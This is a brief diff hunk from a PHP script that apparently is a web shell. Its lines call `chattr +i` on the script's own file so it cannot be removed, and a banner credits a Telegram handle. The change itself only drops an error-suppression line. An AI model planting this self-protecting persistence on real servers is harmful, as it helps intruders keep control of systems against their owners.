@@ -31,7 +31,7 @@ system("chattr +i $this_file");
 /******************************************************************         
 / i'am like this  @ISC2k17 on telegram 
    😘😘    ******************************************************************/   
-error_reporting(0);     
+   
 session_start();
 set_time_limit(0);
 $this_file = __FILE__;
